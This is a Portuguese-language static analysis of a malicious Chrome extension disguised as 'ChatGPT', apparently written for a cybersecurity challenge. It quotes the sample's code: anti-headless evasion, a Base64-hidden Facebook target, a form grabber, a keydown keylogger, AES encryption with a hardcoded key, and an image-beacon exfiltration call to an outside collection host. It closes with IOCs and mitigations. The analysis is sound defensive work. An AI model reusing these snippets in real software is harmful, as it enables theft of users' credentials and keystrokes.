# 🔍 Análise Estática — Extensão Maliciosa "ChatGPT"

> **Desafio de Cybersegurança — Análise de Artefato (Chrome Extension)**
> Análise passiva (somente leitura de código). **Nenhuma execução** da extensão foi realizada.

---

## 📋 Resumo Executivo

O artefato analisado é uma extensão do Chrome disfarçada de assistente de IA ("ChatGPT"). Na realidade, trata-se de um **infostealer** que:

- Monitora exclusivamente o domínio **`www.facebook.com`**;
- Captura credenciais via **form grabbing** (evento `submit`);
- Registra teclas via **keylogger** (evento `keydown`);
- **Criptografa** o payload com **AES** (CryptoJS, chave hardcoded);
- **Exfiltra** os dados via **image beacon** (`<img>`), camuflando o tráfego como carregamento de imagem;
- Possui **evasão anti-análise** (detecção de HeadlessChrome / navegador sem plugins).

---

## 🚨 Indicadores de Compromisso (IOCs)

| Tipo | Valor |
|---|---|
| Domínio C2 | `Mo.Elshaheedy.com` |
| Endpoint de exfiltração | `https://Mo.Elshaheedy.com/collect?data=` |
| Alvo monitorado | `www.facebook.com` |
| Chave AES hardcoded | `SuperSecretKey123` |
| Técnica de exfiltração | `<img>` beacon (GET) |
| Ofuscação | Base64 (`atob` / `btoa`) |

---

## 🗂️ Estrutura do Artefato

```
artefato_extensao.zip
├── manifest.json          → permissões e pontos de entrada
├── system/
│   └── loader.js          → verificador de ambiente (anti-VM/anti-headless)
├── core/
│   ├── app.js             → núcleo de captura, criptografia e exfiltração
│   └── crypto.js          → funções auxiliares de criptografia
└── assets/
    └── ui.html            → interface falsa ("ChatGPT")
```

---

## ✅ Respostas do Questionário

### Parte 1 — Permissões e Evasão

#### Q1 — Recurso sensível solicitado no `manifest.json`

**Resposta:** `cookies`

**Evidência** (`manifest.json`):
```json
"permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage",
    "webRequest",
    "webRequestBlocking",
    "cookies"
]
```

**Explicação:** A permissão `cookies`, combinada com acesso a todos os sites (`http://*/*`, `https://*/*`), permite ler cookies de sessão e autenticação da vítima em qualquer domínio — possibilitando sequestro de sessão.

---

#### Q2 — Primeira condição do `if` que desativa a extensão

**Resposta:**
```js
navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)
```

**Evidência** (`system/loader.js`):
```js
if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
    alert("Virtual environment detected. Extension will disable itself.");
    chrome.runtime.onMessage.addListener(() => {
        return false;
    });
}
```

**Explicação:** Verifica se o navegador está **sem plugins** (`navigator.plugins.length === 0`) ou se é **HeadlessChrome** (via regex no user-agent). Se qualquer condição for verdadeira, a extensão se auto-desativa — evasão contra sandboxes e laboratórios de análise.

> 💡 A primeira sub-condição do `||` é `navigator.plugins.length === 0`.

---

### Parte 2 — Alvos e Ofuscação

#### Q3 — Método de codificação da string do alvo

**Resposta:** **Base64** (decodificado com `atob`)

**Evidência** (`core/app.js`):
```js
var _0xabc1 = function(_0x321a) {
    return atob(_0x321a);
};
...
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

**Explicação:** A string termina em `==` (padding típico de Base64) e é decodificada em runtime via `atob()`. A ofuscação é trivial e visa apenas evitar leitura humana direta do código.

---

#### Q4 — Endereço exato do site monitorado

**Resposta:** `www.facebook.com`

**Decodificação:**
```
d3d3LmZhY2Vib29rLmNvbQ==  →  www.facebook.com
```

**Explicação:** A extensão só ativa o keylogger e o form grabber quando `window.location.hostname` for exatamente `www.facebook.com`, confirmando o alvo de roubo de credenciais.

> ℹ️ **Nota forense:** o domínio de **exfiltração** (C2) é `Mo.Elshaheedy.com`; o domínio **monitorado** (vítima) é o Facebook.

---

### Parte 3 — Coleta de Dados e Keylogging

#### Q5 — Evento DOM para interceptar envio de formulário de login

**Resposta:** `submit`

**Evidência** (`core/app.js`):
```js
document.addEventListener('submit', function(event) {
    let form = event.target;
    let formData = new FormData(form);
    let username = formData.get('username') || formData.get('email');
    let password = formData.get('password');

    if (username && password) {
        exfiltrateCredentials(username, password);
    }
});
```

**Explicação:** Intercepta o evento `submit` para capturar os dados no exato momento em que a vítima envia o formulário de login.

---

#### Q6 — Evento utilizado no `addEventListener` do keylogger

**Resposta:** `keydown`

**Evidência** (`core/app.js`):
```js
document.addEventListener('keydown', function(event) {
    var key = event.key;
    exfiltrateData('keystroke', key);
});
```

**Explicação:** Captura cada tecla pressionada em tempo real e a envia como `keystroke` — keylogger completo além do form grabbing.

---

#### Q7 — Função que extrai nome de usuário e senha

**Resposta:** `exfiltrateCredentials(username, password)`

**Evidência** (`core/app.js`):
```js
if (username && password) {
    exfiltrateCredentials(username, password);
}
```

**Explicação:** Após extrair `username`/`email` e `password` do formulário, a função `exfiltrateCredentials(username, password)` monta o payload e dispara a exfiltração.

---

### Parte 4 — Criptografia e Exfiltração Oculta

#### Q8 — Algoritmo de criptografia utilizado

**Resposta:** **AES** (AES-CBC via CryptoJS, chave hardcoded `SuperSecretKey123`, IV aleatório de 16 bytes, saída em Base64)

**Evidência** (`core/app.js`):
```js
function encryptPayload(data) {
    const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: iv
    });
    return iv.concat(encrypted.ciphertext)
        .toString(CryptoJS.enc.Base64);
}
```

**Explicação:** O payload é criptografado com AES antes de sair pela rede. O IV é concatenado ao ciphertext e tudo é codificado em Base64 — impedindo que firewalls/proxies leiam o conteúdo em texto claro.

> 🔑 **Ponto crítico:** a chave é **hardcoded** no código-fonte (`SuperSecretKey123`). Ou seja, a "proteção" é reversível por qualquer analista — serve apenas para evasão superficial.

---

#### Q9 — Tag HTML criada dinamicamente para camuflar o envio

**Resposta:** `<img>` (via `new Image()`)

**Evidência** (`core/app.js`):
```js
function sendToServer(encryptedData) {
    var img = new Image();
    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
    document.body.appendChild(img);
}
```

**Explicação:** Em vez de `fetch`/`XMLHttpRequest`, cria-se um elemento `<img>` com o payload no atributo `src`. O navegador dispara o GET automaticamente ao renderizar a imagem — exfiltração camuflada de "carregamento de imagem".

---

## 📊 Tabela Resumo

| # | Pergunta | Resposta |
|---|---|---|
| 1 | Permissão sensível | `cookies` |
| 2 | Primeira condição do `if` | `navigator.plugins.length === 0 \|\| /HeadlessChrome/.test(navigator.userAgent)` |
| 3 | Codificação do alvo | Base64 (`atob`) |
| 4 | Site monitorado | `www.facebook.com` |
| 5 | Evento de formulário | `submit` |
| 6 | Evento do keylogger | `keydown` |
| 7 | Função de extração | `exfiltrateCredentials(username, password)` |
| 8 | Algoritmo de criptografia | AES (CryptoJS, chave hardcoded) |
| 9 | Tag de exfiltração | `<img>` (`new Image()`) |

---

## 🧠 Fluxo de Ataque (visão geral)

```
1. Instalação da extensão (disfarçada de "ChatGPT")
        │
        ▼
2. loader.js → checa ambiente (anti-VM/anti-headless)
        │
        ▼
3. Injeção de core/app.js em todas as páginas (<all_urls>)
        │
        ▼
4. Se hostname == www.facebook.com:
        ├── addEventListener('submit')  → captura user + pass
        └── addEventListener('keydown') → captura cada tecla
        │
        ▼
5. encryptPayload() → AES + Base64
        │
        ▼
6. sendToServer() → <img src="https://Mo.Elshaheedy.com/collect?data=...">
        │
        ▼
7. Exfiltração via GET camuflado como imagem
```

---

## 🛡️ Recomendações de Mitigação

- **Bloquear** o domínio `Mo.Elshaheedy.com` em DNS/proxy/firewall;
- **Revogar** permissões e **remover** a extensão de todos os endpoints;
- **Resetar senhas** e **invalidar sessões** de usuários que instalaram a extensão (foco em Facebook);
- **Habilitar MFA** nas contas afetadas;
- **Auditar** extensões instaladas via política de navegador (allowlist);
- **Monitorar** tráfego para requisições GET com payload Base64 em parâmetro `data=`.

---

## ⚠️ OPSEC

- Nenhuma execução da extensão foi realizada;
- Análise 100% estática (leitura de código-fonte);
- O arquivo `.zip` do malware **não** foi incluído neste repositório.
